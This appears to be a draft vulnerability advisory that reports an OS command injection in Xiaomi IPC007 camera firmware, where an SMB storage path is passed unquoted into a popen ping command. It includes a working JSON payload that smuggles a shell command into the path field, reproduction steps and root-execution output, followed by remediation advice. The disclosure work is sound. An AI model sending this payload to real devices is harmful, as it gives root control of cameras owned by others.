# VulnDB submission draft - Xiaomi IPC007 SMB route-storage command injection

## Summary

`/usr/imi/imiApp` in Xiaomi IPC007 camera firmware accepts an SMB route-storage path through the `set_smb_storage_path` command and later embeds the parsed host string into `ping %s -c 2` without shell quoting. A path containing shell metacharacters is stored as `route_SmbPath` and later executed by `popen`, resulting in root command execution.

## Affected Products

- Vendor: Xiaomi
- Product family: Xiaomi IPC camera firmware
- Program asset to select/report: Xiaomi smart camera / Xiaomi IPC camera firmware
- Specific affected asset: IPC007 camera firmware branch, `/usr/imi/imiApp`
- Confirmed firmware:
  - `IPC007A_3.5.8_20031301_C.zip`
  - `IPC007B_3.5.7_19111803.zip`
- Affected binary: `/usr/imi/imiApp`

If the submission portal requires a scoped asset, this should be filed under Xiaomi smart camera / Xiaomi IoT camera firmware, not Xiaomi router, mobile app, or cloud-only assets. The exact firmware identifiers proven in this report are `IPC007A_3.5.8_20031301_C` and `IPC007B_3.5.7_19111803`.

## Vulnerability Classification

- Type: OS command injection
- CWE: CWE-78
- Impact: root command execution
- Status: confirmed 0day candidate
- Severity: High, conditional on access to the local/cloud/miIO command path

## Attack Prerequisite

The recovered firmware starts Mosquitto locally and configures it with `bind_address 127.0.0.1`. Direct unauthenticated LAN publication to the MQTT broker was not proven. Exploitation requires the ability to send or cause a `set_smb_storage_path` command through the device's local broker, cloud command bridge, or another trusted miIO command producer.

## Technical Details

IPC007A:

- Dispatcher: `FUN_00034748`
- Vulnerable command handler: `FUN_00033248`
- Path storage: `FUN_0006d310`
- Command sink: `FUN_0007a310`

IPC007B:

- Dispatcher: `FUN_000330fc`
- Vulnerable command handler: `FUN_00031bfc`
- Path storage: `FUN_0006d070`
- Command sink: `FUN_0007a070`

The vulnerable handler accepts JSON command input:

```json
{"id":1,"method":"set_smb_storage_path","params":[{"user":"u","pswd":"p","path":"smb://127.0.0.1 -c 1;id>IPC007PWN;#/share"}]}
```

The path validator only checks:

- `path` is non-empty
- `path` contains `smb://`
- `path` does not contain `@`

It does not reject or escape shell metacharacters. The accepted path is written to:

```text
/usr/imi/usrinfo/route_storage.conf
```

as:

```text
route_SmbPath=smb://127.0.0.1 -c 1;id>IPC007PWN;#/share
```

The media-storage route code later parses the SMB path and passes the host portion into:

```c
snprintf(cmd, 0x1ff, "ping %s -c 2", param_1);
popen(cmd, "r");
```

This executes the injected `id>IPC007PWN` command as root.

## Proof of Concept

Path payload:

```text
smb://127.0.0.1 -c 1;id>IPC007PWN;#/share
```

The route parser uses `strtok(path, "smb://")`, which treats `s`, `m`, `b`, `:`, and `/` as delimiter characters. The command portion should therefore avoid those characters if the exploit is intended to survive that parser exactly.

Runtime evidence from patched-entry QEMU harnesses:

- IPC007A setpath proof: `inout/reports/xiaomi_ipc_manual/ipc007_runtime/route_setpath_poc/summary.txt`
- IPC007A sink proof: `inout/reports/xiaomi_ipc_manual/ipc007_runtime/route_ping_poc/chain_safe.summary`
- IPC007B setpath proof: `inout/reports/xiaomi_ipc_manual/ipc007_runtime/route_setpath_poc_B/summary.txt`
- IPC007B sink proof: `inout/reports/xiaomi_ipc_manual/ipc007_runtime/route_ping_poc_B/chain_safe.summary`

Observed root impact:

```text
uid=0(root) gid=0(root) groups=0(root)
```

## Steps to Reproduce

1. Use an affected Xiaomi IPC007 firmware/device running `/usr/imi/imiApp` from either `IPC007A_3.5.8_20031301_C` or `IPC007B_3.5.7_19111803`.
2. Obtain the normal ability to send or cause a miIO route-storage command to the device. In the recovered firmware this command path is exposed through the local/cloud/miIO command flow; direct unauthenticated LAN MQTT publication was not proven because Mosquitto is configured with `bind_address 127.0.0.1`.
3. Send the following command to the `miio/command` handler or an equivalent trusted miIO command producer:

```json
{"id":1,"method":"set_smb_storage_path","params":[{"user":"u","pswd":"p","path":"smb://127.0.0.1 -c 1;id>IPC007PWN;#/share"}]}
```

4. Confirm that the device accepts the value and persists it in `/usr/imi/usrinfo/route_storage.conf`:

```text
route_SmbPath=smb://127.0.0.1 -c 1;id>IPC007PWN;#/share
```

5. Trigger the SMB route/media-storage path that tests the SMB host. The vulnerable code extracts the host portion and builds:

```text
ping 127.0.0.1 -c 1;id>IPC007PWN;# -c 2
```

6. Observe that the injected command runs as root. In the local runtime harness, the output file contained:

```text
uid=0(root) gid=0(root) groups=0(root)
```

## Inline Runtime Results

The key runtime results are included here so the report can be reviewed without opening separate evidence files.

IPC007A setpath result:

```text
msg={"id":1,"method":"set_smb_storage_path","params":[{"user":"u","pswd":"p","path":"smb://127.0.0.1 -c 1;id>IPC007PWN;#/share"}]}
rc=139
route_conf_exists=yes
route_conf_contents:
route_SmbPath=smb://127.0.0.1 -c 1;id>IPC007PWN;#/share
```

IPC007A sink result:

```text
payload=127.0.0.1 -c 1;id>IPC007PWN;#
simulated_smb_path=smb://127.0.0.1 -c 1;id>IPC007PWN;#/share
rc=0
sentinel_root_slash=yes
sentinel_content_slash=uid=0(root) gid=0(root) groups=0(root)
```

IPC007B setpath result:

```text
msg={"id":1,"method":"set_smb_storage_path","params":[{"user":"u","pswd":"p","path":"smb://127.0.0.1 -c 1;id>IPC007BPWN;#/share"}]}
rc=139
route_conf_exists=yes
route_conf_contents:
route_SmbPath=smb://127.0.0.1 -c 1;id>IPC007BPWN;#/share
```

IPC007B sink result:

```text
payload=127.0.0.1 -c 1;id>IPC007BPWN;#
simulated_smb_path=smb://127.0.0.1 -c 1;id>IPC007BPWN;#/share
rc=0
sentinel_root_slash=yes
sentinel_content_slash=uid=0(root) gid=0(root) groups=0(root)
```

The `rc=139` in the setpath harness occurs after the tested handler returns because the harness jumps directly into the function without full device initialization. The important result is that the vulnerable handler accepts and writes the malicious `route_SmbPath` before that harness crash. The sink harness exits cleanly with `rc=0` and demonstrates root command execution.

## 0day Dedupe

Exact public searches for `set_smb_storage_path`, `route_SmbPath`, `ProcMsg_SmbRouteStorage_SetPath`, and the `imiApp` SMB route-storage command chain did not identify an existing public advisory.

Related public Xiaomi camera research exists for TASZK's 2026 Xiaomi C400 miIO protocol chain (`https://labs.taszk.io/articles/post/nowyouseemi/`), but that work targets `miio_client` UDP protocol flaws and does not describe this `imiApp` SMB route-storage command injection.

## Remediation

- Do not build shell commands with untrusted SMB path content.
- Replace `popen("ping %s -c 2")` with direct `execve`/argument-vector execution.
- Strictly parse the SMB URI and allow only valid hostname/IP characters in the host field.
- Reject shell metacharacters in persisted route-storage values.
- Treat `route_storage.conf` as untrusted input when reloaded.
- Add authentication and authorization checks before accepting route-storage configuration changes from miIO/MQTT command paths.





from：ST4R
